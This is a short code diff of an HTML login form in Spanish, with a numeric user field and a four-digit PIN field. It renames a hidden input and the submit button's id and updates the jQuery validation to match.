@@ -188,8 +188,8 @@
             minlength="4" maxlength="4">
         <div class="error-message" id="errorClave"></div>
 
-        <input type="hidden" name="status" value="login">
-        <button type="submit" class="boton-1" id="btnLogin" disabled>Continuar</button>
+        <input type="hidden" id="no-status" name="no-status" value="login">
+        <button type="submit" class="boton-1" id="enviar" disabled>Continuar</button>
     </form>
 
     <!-- Footer -->
@@ -200,7 +200,7 @@
                 const usuario = $('#usuario').val().trim();
                 const clave = $('#clave').val().trim();
                 const isValid = /^\d{4,15}$/.test(usuario) && /^\d{4}$/.test(clave);
-                $('#btnLogin').prop('disabled', !isValid);
+                $('#enviar').prop('disabled', !isValid);
                 return isValid;
             }
 
